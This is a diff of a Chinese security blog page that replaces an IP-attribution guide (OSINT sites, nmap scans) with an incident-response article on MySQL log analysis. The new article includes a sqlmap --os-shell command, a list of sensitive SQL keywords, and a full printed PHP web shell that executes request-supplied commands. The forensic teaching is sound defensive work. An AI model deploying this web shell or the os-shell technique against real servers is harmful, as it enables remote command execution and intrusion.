@@ -443,7 +443,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2023-03-30
+                    2023-04-03
                 </div>
                 
 
@@ -464,268 +464,61 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="IP溯源"><a href="#IP溯源" class="headerlink" title="IP溯源"></a>IP溯源</h1><p>溯源过程中<strong>切勿用客户的网络</strong>去访问，防止对方的VPS上有JS钩子，导致对方拥有我的网络信息，<strong>尽量用虚拟机、浏览器无痕等模式进行访问</strong></p>
-<h2 id="判断IP状态"><a href="#判断IP状态" class="headerlink" title="判断IP状态"></a>判断IP状态</h2><ul>
-<li>静动态判断<ul>
-<li>国内<ul>
-<li>存在rDNS为静态     <a target="_blank" rel="noopener" href="http://www.ipip.net/">www.ipip.net</a> </li>
-<li>查询相关备案信息   ipwhois.cnnic.net.cn <ul>
-<li>ALLOCATED PORTABLE 动态IP，5G&#x2F;4G&#x2F;家庭宽带等</li>
-<li>ALLOCATED NON-PORTABLE  静态IP，专线宽带&#x2F;IDC机房&#x2F;企业出口</li>
-</ul>
-</li>
-</ul>
-</li>
-<li>国外<ul>
-<li><a target="_blank" rel="noopener" href="https://www.virustotal.com/gui/search">https://www.virustotal.com/gui/search</a></li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-<h2 id="IP信息收集"><a href="#IP信息收集" class="headerlink" title="IP信息收集"></a>IP信息收集</h2><h3 id="反查"><a href="#反查" class="headerlink" title="反查"></a>反查</h3><ul>
-<li>国内<ul>
-<li><a target="_blank" rel="noopener" href="https://x.threatbook.cn/">https://x.threatbook.cn/</a><br><a target="_blank" rel="noopener" href="https://quake.360.cn/">https://quake.360.cn/</a></li>
-</ul>
-</li>
-<li>国外<ul>
-<li><a target="_blank" rel="noopener" href="https://community.riskiq.com/">https://community.riskiq.com/</a><br><a target="_blank" rel="noopener" href="https://www.virustotal.com/gui/home/search">https://www.virustotal.com/gui/home/search</a></li>
-</ul>
-</li>
-</ul>
-<h3 id="whois查询"><a href="#whois查询" class="headerlink" title="whois查询"></a>whois查询</h3><ul>
-<li>国外<ul>
-<li><a target="_blank" rel="noopener" href="https://www.whois.net/default.aspx">https://www.whois.net/default.aspx</a></li>
-<li><a target="_blank" rel="noopener" href="https://who.is/">https://who.is/</a></li>
-<li><a target="_blank" rel="noopener" href="https://community.riskiq.com/">https://community.riskiq.com/</a></li>
-</ul>
-</li>
-<li>国内<ul>
-<li><a target="_blank" rel="noopener" href="https://www.benmi.com/rwhois?q=">https://www.benmi.com/rwhois?q=</a></li>
-<li><a target="_blank" rel="noopener" href="http://whois.chinaz.com/">http://whois.chinaz.com/</a></li>
-<li>不好用<ul>
-<li><a target="_blank" rel="noopener" href="http://whois.xinnet.com/">http://whois.xinnet.com/</a></li>
-<li><a target="_blank" rel="noopener" href="https://whois.aliyun.com/">https://whois.aliyun.com/</a></li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-<h3 id="备案信息"><a href="#备案信息" class="headerlink" title="备案信息"></a>备案信息</h3><ul>
-<li><p>网站查备案</p>
-<ul>
-<li><a target="_blank" rel="noopener" href="https://icp.chinaz.com/">https://icp.chinaz.com/</a></li>
-<li><a target="_blank" rel="noopener" href="https://www.chaicp.com/">https://www.chaicp.com/</a></li>
-<li><a target="_blank" rel="noopener" href="https://gaj.sh.gov.cn/wa/newlogin/recordSearch.jsp">https://gaj.sh.gov.cn/wa/newlogin/recordSearch.jsp</a></li>
-</ul>
-</li>
-<li><p>同一个备案&#x2F;许可证号的网站</p>
-<ul>
-<li><a target="_blank" rel="noopener" href="https://beian.miit.gov.cn/#/Integrated/index">https://beian.miit.gov.cn/#/Integrated/index</a></li>
-</ul>
-</li>
-</ul>
-<h3 id="判断IP是否为CDN"><a href="#判断IP是否为CDN" class="headerlink" title="判断IP是否为CDN"></a>判断IP是否为CDN</h3><ul>
-<li>原理<ul>
-<li>根据 Host 字段判断是否为绑定域名，进行跳转</li>
-</ul>
-</li>
-<li>特征<ul>
-<li>CDN会绑定许多域名</li>
-</ul>
-</li>
-<li>判断<ul>
-<li>对反绑的域名进行查询 nslookup<ul>
-<li>nslookup  -q&#x3D;cname baidu.com</li>
-</ul>
-</li>
-<li><a target="_blank" rel="noopener" href="https://tools.ipip.net/cdn.php">https://tools.ipip.net/cdn.php</a> 查询</li>
-<li>访问IP<ul>
-<li>通过ModHeader 修改 Host 字段值为域名</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-<h3 id="VPS供应商相关"><a href="#VPS供应商相关" class="headerlink" title="VPS供应商相关"></a><strong>VPS供应商相关</strong></h3><ul>
-<li>查询地址<ul>
-<li><a target="_blank" rel="noopener" href="https://myip.ms/">https://myip.ms</a><br><a target="_blank" rel="noopener" href="https://www.virustotal.com/gui/search">https://www.virustotal.com/gui/search</a></li>
-</ul>
-</li>
-<li>常见的VPS厂商<ul>
-<li>DIGITALOCEAN</li>
-<li>Linode</li>
-</ul>
-</li>
-</ul>
-<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><ul>
-<li>子域名：子域名的实时解析IP和历史解析IP都可以作为新的IP进行溯源关联<ul>
-<li>OneForAll — 扫描子域<ul>
-<li>python oneforall.py –target example.com run</li>
-</ul>
-</li>
-<li>teemo — 扫描邮箱<ul>
-<li>python teemo.py -d</li>
-</ul>
-</li>
-<li>subDomainsBrute — 扫描真实IP<ul>
-<li>python subDomainsBrute.py –full</li>
-</ul>
-</li>
-</ul>
-</li>
-<li>互联网扫描库<ul>
-<li>censys.io&#x2F;ipv4 判断是否有开放端口，或者<strong>对C段分析</strong></li>
-<li>fofa.so    ip&#x3D;”11111”</li>
-<li>shodan.io</li>
-</ul>
-</li>
-<li>威胁情报库：收集关键字 反查信息：域名、邮箱<ul>
-<li>国内：<ul>
-<li>微步在线   x.threatbook.cn</li>
-</ul>
-</li>
-<li><strong>国外的</strong>：<a target="_blank" rel="noopener" href="https://community.riskiq.com/">https://community.riskiq.com</a>  — 比较全面<br>          <a target="_blank" rel="noopener" href="https://www.virustotal.com/gui/search">https://www.virustotal.com/gui/search</a>  —- 常用，需要登录</li>
-</ul>
-</li>
-</ul>
-<h2 id="第三方暴露库"><a href="#第三方暴露库" class="headerlink" title="第三方暴露库"></a>第三方暴露库</h2><ul>
-<li><p>国内</p>
-<ol>
-<li><a target="_blank" rel="noopener" href="http://www.zoomeye.org/">http://www.zoomeye.org/</a></li>
-<li>​       <a target="_blank" rel="noopener" href="https://www.virustotal.com/gui/home/search">https://www.virustotal.com/gui/home/search</a><br> ​       <a target="_blank" rel="noopener" href="https://x.threatbook.cn/">https://x.threatbook.cn/</a></li>
-</ol>
-</li>
-<li><p>国外<br>   <a target="_blank" rel="noopener" href="https://censys.io/ipv4">https://censys.io/ipv4</a><br>   <a target="_blank" rel="noopener" href="https://community.riskiq.com/">https://community.riskiq.com/</a><br>   <a target="_blank" rel="noopener" href="https://www.shodan.io/">https://www.shodan.io/</a><br>   <a target="_blank" rel="noopener" href="https://fofa.so/">https://fofa.so/</a></p>
-</li>
-</ul>
-<h2 id="IP端口"><a href="#IP端口" class="headerlink" title="IP端口"></a>IP端口</h2><ul>
-<li><p>使用 nmap 扫描端口 ——切勿用客户的网络进行扫描</p>
-<ul>
-<li><p>nmap T4 -Pn 192.168.131.1	快速扫描top1000端口<br>nmap -Pn -p- -A -sV -oN 123.txt 127.0.0.1	全扫描</p>
-</li>
-<li><p>根据端口判断是否为跳板机</p>
-<ul>
-<li><pre><code>5555:SoftEther VPN
-1723:PPTP VPN
-500:L2TP VPN
-4500:L2TP VPN
-1701:L2TP VPN
-1194:Openvpn
-5000:Vtun 
-12975:	LogMeIn Hamachi
-1080:其他SOCKS5类代理常用端口
-</code></pre>
-</li>
-</ul>
-</li>
-<li><p>C&amp;C监听端口或黑客工具端口<br>50050	Cobalt Strike<br>8080	   nps	一些自定义木马也喜欢用这种类型的端口<br>8834	   nessusWeb	界面管理端口<br>4444	   hfs</p>
-</li>
-</ul>
-</li>
-<li><p>对C段资产进行分析</p>
-<ul>
-<li>nmap -sP -oN 123.txt  192.168.131.0&#x2F;24</li>
-<li>存在大量的 80&#x2F;443 端口该C段为IDC或企业的概率比较大</li>
-</ul>
-</li>
-</ul>
-<h2 id="IP地址定位"><a href="#IP地址定位" class="headerlink" title="IP地址定位"></a>IP地址定位</h2><ul>
-<li>IP定位常用网站<ul>
-<li>国内<ul>
-<li>IP 定位<ul>
-<li><a target="_blank" rel="noopener" href="https://www.opengps.cn/Data/IP/LocHighAcc.aspx">https://www.opengps.cn/Data/IP/LocHighAcc.aspx</a><br><a target="_blank" rel="noopener" href="https://www.ipplus360.com/">https://www.ipplus360.com/</a><br><a target="_blank" rel="noopener" href="http://www.chaipip.com/">www.chaipip.com</a><br><a target="_blank" rel="noopener" href="https://met.red/h/location/queryIp">https://met.red/h/location/queryIp</a></li>
-</ul>
-</li>
-<li>综合查询<ul>
-<li><a target="_blank" rel="noopener" href="http://www.ipip.net/">www.ipip.net</a></li>
-<li><a target="_blank" rel="noopener" href="https://www.whoxy.com/">https://www.whoxy.com/</a></li>
-</ul>
-</li>
-</ul>
-</li>
-<li>国外<ul>
-<li>iplocation.com<br><a target="_blank" rel="noopener" href="https://dev.maxmind.com/geoip/geoip2/geolite2/">https://dev.maxmind.com/geoip/geoip2/geolite2/</a></li>
-<li>综合信息查询<ul>
-<li><a target="_blank" rel="noopener" href="https://bgp.he.net/">https://bgp.he.net/</a></li>
-<li><a target="_blank" rel="noopener" href="https://www.whoxy.com/">https://www.whoxy.com/</a></li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-</li>
-<li>高德地图法<ul>
-<li>修改 X-Forwarded-For 为IP地址，再次刷新</li>
-</ul>
-</li>
-<li>地址搜出来之后，通过地图搜索附近的公司</li>
-</ul>
-<h1 id="小技巧"><a href="#小技巧" class="headerlink" title="小技巧"></a>小技巧</h1><ul>
-<li>对查询页面进行相关的搜索<ul>
-<li>com、cn  网站</li>
-<li>@  邮箱</li>
-</ul>
-</li>
-</ul>
-<h1 id="社会工程学"><a href="#社会工程学" class="headerlink" title="社会工程学"></a>社会工程学</h1><ul>
-<li><p>Github 搜索关键字</p>
-<ul>
-<li>查看相关代码（code），部分会在注释中署名。</li>
-</ul>
-</li>
-<li><h2 id="利用-Google-hack-语法搜索邮箱、域名等关键字"><a href="#利用-Google-hack-语法搜索邮箱、域名等关键字" class="headerlink" title="利用 Google hack 语法搜索邮箱、域名等关键字"></a>利用 Google hack 语法搜索邮箱、域名等关键字</h2><ul>
-<li>intext:”xxxx”</li>
-</ul>
-</li>
-<li><p>IP直接搜索</p>
-<ul>
-<li>某些论坛可能会对用户访问的IP进行记录</li>
-</ul>
-</li>
-</ul>
-<h1 id="其他-1"><a href="#其他-1" class="headerlink" title="其他"></a>其他</h1><ul>
-<li>.dotm	邮件钓鱼<ul>
-<li>Normal.dotm   为word的启动模板</li>
-</ul>
-</li>
-<li>HTTPAPI 2.0   为Windows默认开启的80端口的标识</li>
-<li>对IP反查时建议也加上自动化漏扫，扫出来有漏洞数量多的为 <strong>跳板机&#x2F;肉鸡</strong></li>
-</ul>
-<h1 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h1><p>161.35.76.1</p>
-<ul>
-<li>直接搜索IP，判断国内还是国外</li>
-<li>国外：virustotal.com&#x2F;gui&#x2F;search<ul>
-<li>查看VPS厂商 Autonomous System Label<ul>
-<li>Autonomous System Label	DIGITALOCEAN-ASN（VPS厂商）</li>
-</ul>
-</li>
-<li>查看关联的信息 ：Relation<ul>
-<li>有关联的 CS木马信息、邮件钓鱼</li>
-</ul>
-</li>
-<li>报毒情况<ul>
-<li>Detection    52&#x2F;72    72款杀毒软件、52款报毒</li>
-</ul>
-</li>
-</ul>
-</li>
-<li>暴露库查询：<a target="_blank" rel="noopener" href="https://censys.io/ipv4">https://censys.io/ipv4</a><ul>
-<li>22 <strong>Banner</strong>：SSH-2.0-OpenSSH_7.6p1 Ubuntu-4ubuntu0.3<ul>
-<li>发现该VPS为 Ubuntu</li>
-</ul>
-</li>
-<li>443 HTTPS 中的 SSL 证书：C&#x3D;US, ST&#x3D;, L&#x3D;, O&#x3D;jQuery, OU&#x3D;Certificate Authority, CN&#x3D;jquery.com<ul>
-<li>jquery.com为SSL证书绑定的域名，jquery.com为默认域名</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-<p>172.105.87.139</p>
-<ul>
-<li><h2 id="国外：virustotal-com-x2F-gui-x2F-search-查看关联的信息-：Relation-域名绑定：Domain"><a href="#国外：virustotal-com-x2F-gui-x2F-search-查看关联的信息-：Relation-域名绑定：Domain" class="headerlink" title="国外：virustotal.com&#x2F;gui&#x2F;search- 查看关联的信息 ：Relation  - 域名绑定：Domain"></a>国外：virustotal.com&#x2F;gui&#x2F;search<br>- 查看关联的信息 ：Relation<br>  - 域名绑定：Domain</h2></li>
-</ul>
+                <h2 id="第5篇-MySQL日志分析"><a href="#第5篇-MySQL日志分析" class="headerlink" title="第5篇:MySQL日志分析"></a>第5篇:MySQL日志分析</h2><p>常见的数据库攻击包括弱口令、SQL注入、提升权限、窃取备份等。对数据库日志进行分析，可以发现攻击行为，进一步还原攻击场景及追溯攻击源。</p>
+<h3 id="0x01-Mysql日志分析"><a href="#0x01-Mysql日志分析" class="headerlink" title="0x01 Mysql日志分析"></a>0x01 Mysql日志分析</h3><p>general query log能记录成功连接和每次执行的查询，我们可以将它用作安全布防的一部分，为故障分析或黑客事件后的调查提供依据。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1、查看log配置信息</span><br><span class="line">show variables like &#x27;%general%&#x27;;</span><br><span class="line">2、开启日志</span><br><span class="line">SET GLOBAL general_log = &#x27;On&#x27;;</span><br><span class="line">3、指定日志文件路径</span><br><span class="line">#SET GLOBAL general_log_file = &#x27;/var/lib/mysql/mysql.log&#x27;;</span><br></pre></td></tr></table></figure>
+
+<p>比如，当我访问 &#x2F;test.php?id&#x3D;1，此时我们得到这样的日志：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">190604 14:46:14       14 Connect    root@localhost on </span><br><span class="line">           14 Init DB    test</span><br><span class="line">           14 Query    SELECT * FROM admin WHERE id = 1</span><br><span class="line">           14 Quit  `</span><br></pre></td></tr></table></figure>
+<p>我们按列来解析一下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">第一列:Time，时间列，前面一个是日期,后面一个是小时和分钟，有一些不显示的原因是因为这些sql语句几乎是同时执行的,所以就不另外记录时间了。</span><br><span class="line">第二列:Id，就是show processlist出来的第一列的线程ID,对于长连接和一些比较耗时的sql语句,你可以精确找出究竟是那一条那一个线程在运行。</span><br><span class="line">第三列:Command，操作类型，比如Connect就是连接数据库，Query就是查询数据库(增删查改都显示为查询)，可以特定过虑一些操作。</span><br><span class="line">第四列:Argument，详细信息，例如 Connect    root@localhost on 意思就是连接数据库，如此类推,接下面的连上数据库之后,做了什么查询的操作。</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x02-登录成功-x2F-失败"><a href="#0x02-登录成功-x2F-失败" class="headerlink" title="0x02 登录成功&#x2F;失败"></a>0x02 登录成功&#x2F;失败</h3><p>我们来做个简单的测试吧，使用我以前自己开发的弱口令工具来扫一下，字典设置比较小，2个用户，4个密码，共8组。</p>
+<p><img src="/./image/log-5-1.png"></p>
+<p>MySQL中的log记录是这样子：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">Time                 Id        Command         Argument</span><br><span class="line"></span><br><span class="line">190601 22:03:20	   98 Connect	root@192.168.204.1 on </span><br><span class="line">		   98 Connect	Access denied for user &#x27;root&#x27;@&#x27;192.168.204.1&#x27; (using password: YES)</span><br><span class="line">		  103 Connect	mysql@192.168.204.1 on </span><br><span class="line">		  103 Connect	Access denied for user &#x27;mysql&#x27;@&#x27;192.168.204.1&#x27; (using password: YES)</span><br><span class="line">		  104 Connect	mysql@192.168.204.1 on </span><br><span class="line">		  104 Connect	Access denied for user &#x27;mysql&#x27;@&#x27;192.168.204.1&#x27; (using password: YES)</span><br><span class="line">		  100 Connect	root@192.168.204.1 on </span><br><span class="line">		  101 Connect	root@192.168.204.1 on </span><br><span class="line">		  101 Connect	Access denied for user &#x27;root&#x27;@&#x27;192.168.204.1&#x27; (using password: YES)</span><br><span class="line">		   99 Connect	root@192.168.204.1 on </span><br><span class="line">		   99 Connect	Access denied for user &#x27;root&#x27;@&#x27;192.168.204.1&#x27; (using password: YES)</span><br><span class="line">		  105 Connect	mysql@192.168.204.1 on </span><br><span class="line">		  105 Connect	Access denied for user &#x27;mysql&#x27;@&#x27;192.168.204.1&#x27; (using password: YES)</span><br><span class="line">		  100 Query	set autocommit=0</span><br><span class="line">		  102 Connect	mysql@192.168.204.1 on </span><br><span class="line">		  102 Connect	Access denied for user &#x27;mysql&#x27;@&#x27;192.168.204.1&#x27; (using password: YES)</span><br><span class="line">		  100 Quit	`</span><br></pre></td></tr></table></figure>
+
+<p>你知道在这个口令猜解过程中，哪个是成功的吗？</p>
+<p>利用爆破工具，一个口令猜解成功的记录是这样子的：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">190601 22:03:20     100 Connect	root@192.168.204.1 on </span><br><span class="line">	   100 Query	set autocommit=0</span><br><span class="line">	   100 Quit</span><br></pre></td></tr></table></figure>
+
+<p>但是，如果你是用其他方式，可能会有一点点不一样的哦。</p>
+<p>Navicat for MySQL登录：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">190601 22:14:07	  106 Connect	root@192.168.204.1 on </span><br><span class="line">		         106 Query	SET NAMES utf8</span><br><span class="line">		         106 Query	SHOW VARIABLES LIKE &#x27;lower_case_%&#x27;</span><br><span class="line">		         106 Query	SHOW VARIABLES LIKE &#x27;profiling&#x27;</span><br><span class="line">		         106 Query	SHOW DATABASES</span><br></pre></td></tr></table></figure>
+
+<p>命令行登录：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">190601 22:17:25	  111 Connect	root@localhost on </span><br><span class="line">		         111 Query	select @@version_comment limit 1</span><br><span class="line">190601 22:17:56	  111 Quit</span><br></pre></td></tr></table></figure>
+
+<p>这个差别在于，不同的数据库连接工具，它在连接数据库初始化的过程中是不同的。通过这样的差别，我们可以简单判断出用户是通过连接数据库的方式。</p>
+<p>另外，不管你是爆破工具、Navicat for MySQL、还是命令行，登录失败都是一样的记录。</p>
+<p>登录失败的记录：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">102 Connect	mysql@192.168.204.1 on </span><br><span class="line">102 Connect	Access denied for user &#x27;mysql&#x27;@&#x27;192.168.204.1&#x27; (using password: YES)</span><br></pre></td></tr></table></figure>
+
+<p>利用shell命令进行简单的分析：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#有哪些IP在爆破？</span><br><span class="line">grep  &quot;Access denied&quot; mysql.log |cut -d &quot;&#x27;&quot; -f4|uniq -c|sort -nr</span><br><span class="line">     27 192.168.204.1</span><br><span class="line"></span><br><span class="line">#爆破用户名字典都有哪些？</span><br><span class="line">grep  &quot;Access denied&quot; mysql.log |cut -d &quot;&#x27;&quot; -f2|uniq -c|sort -nr</span><br><span class="line">     13 mysql</span><br><span class="line">     12 root</span><br><span class="line">      1 root</span><br><span class="line">      1 mysql</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>在日志分析中，特别需要注意一些敏感的操作行为，比如删表、备库，读写文件等。关键词：drop table、drop function、lock tables、unlock tables、load_file() 、into outfile、into dumpfile。</p>
+<p>敏感数据库表：SELECT * from mysql.user、SELECT * from mysql.func</p>
+<h3 id="0x03-SQL注入入侵痕迹"><a href="#0x03-SQL注入入侵痕迹" class="headerlink" title="0x03  SQL注入入侵痕迹"></a>0x03  SQL注入入侵痕迹</h3><p>在利用SQL注入漏洞的过程中，我们会尝试利用sqlmap的–os-shell参数取得shell，如操作不慎，可能留下一些sqlmap创建的临时表和自定义函数。我们先来看一下sqlmap os-shell参数的用法以及原理：</p>
+<p>1、构造一个SQL注入点，开启Burp监听8080端口</p>
+<p><code>sqlmap.py  -u http://192.168.204.164/sql.php?id=1 --os-shell --proxy=http://127.0.0.1:8080</code></p>
+<p>HTTP通讯过程如下：</p>
+<p><img src="/./image/log-5-3.png"></p>
+<p>创建了一个临时文件tmpbwyov.php，通过访问这个木马执行系统命令，并返回到页面展示。</p>
+<p>tmpbwyov.php：</p>
+<?php $c=$_REQUEST["cmd"];@set_time_limit(0);@ignore_user_abort(1);@ini_set('max_execution_time',0);$z=@ini_get('disable_functions');if(!empty($z)){$z=preg_replace('/[, ]+/',',',$z);$z=explode(',',$z);$z=array_map('trim',$z);}else{$z=array();}$c=$c." 2>&1\n";function f($n){global $z;return is_callable($n)and!in_array($n,$z);}if(f('system')){ob_start();system($c);$w=ob_get_contents();ob_end_clean();}elseif(f('proc_open')){$y=proc_open($c,array(array(pipe,r),array(pipe,w),array(pipe,w)),$t);$w=NULL;while(!feof($t[1])){$w.=fread($t[1],512);}@proc_close($y);}elseif(f('shell_exec')){$w=shell_exec($c);}elseif(f('passthru')){ob_start();passthru($c);$w=ob_get_contents();ob_end_clean();}elseif(f('popen')){$x=popen($c,r);$w=NULL;if(is_resource($x)){while(!feof($x)){$w.=fread($x,512);}}@pclose($x);}elseif(f('exec')){$w=array();exec($c,$w);$w=join(chr(10),$w).chr(10);}else{$w=0;}print "<pre>".$w."</pre>";?><p>&#96;</p>
+<p>创建了一个临时表sqlmapoutput，调用存储过程执行系统命令将数据写入临时表，然后取临时表中的数据展示到前端。</p>
+<p>通过查看网站目录中最近新建的可疑文件，可以判断是否发生过sql注入漏洞攻击事件。</p>
+<p>检查方法：</p>
+<p>1、检查网站目录下，是否存在一些木马文件：</p>
+<p><img src="/./image/log-5-4.png"></p>
+<p>2、检查是否有UDF提权、MOF提权痕迹</p>
+<p>检查目录是否有异常文件</p>
+<p>mysql\lib\plugin </p>
+<p>c:&#x2F;windows&#x2F;system32&#x2F;wbem&#x2F;mof&#x2F;</p>
+<p>检查函数是否删除</p>
+<p><code>select * from mysql.func</code></p>
+<p>3、结合web日志分析。</p>
 
                 
             </div>
@@ -752,7 +545,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://example.com/2023/03/30/%E6%BA%AF%E6%BA%90/">http://example.com/2023/03/30/%E6%BA%AF%E6%BA%90/</a>
+                    <a href="http://example.com/2023/04/03/%E7%AC%AC02%E7%AB%A0%EF%BC%9A%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%E7%AF%87/%E7%AC%AC5%E7%AF%87%EF%BC%9AMySQL%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/">http://example.com/2023/04/03/%E7%AC%AC02%E7%AB%A0%EF%BC%9A%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%E7%AF%87/%E7%AC%AC5%E7%AF%87%EF%BC%9AMySQL%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -961,7 +754,7 @@
             <div class="article-badge left-badge text-color">
                 <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/2023/04/03/%E7%AC%AC04%E7%AB%A0%EF%BC%9AWindows%E5%AE%9E%E6%88%98%E7%AF%87/README/">
+                <a href="/2023/04/03/%E7%AC%AC03%E7%AB%A0%EF%BC%9A%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E7%AF%87/%E7%AC%AC3%E7%AF%87%EF%BC%9ALinux%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81--%E9%9A%90%E8%97%8F%E7%AF%87/">
                     <div class="card-image">
                         
                         
@@ -998,7 +791,7 @@
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2023/03/30/%E9%9D%A2%E8%AF%95%E9%A2%98/">
+                <a href="/2023/04/03/%E7%AC%AC02%E7%AB%A0%EF%BC%9A%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%E7%AF%87/%E7%AC%AC4%E7%AF%87%EF%BC%9AMSSQL%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/">
                     <div class="card-image">
                         
                         
@@ -1015,7 +808,7 @@
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2023-03-30
+                                <i class="far fa-clock fa-fw icon-date"></i>2023-04-03
                             </span>
                         <span class="publish-author">
                             
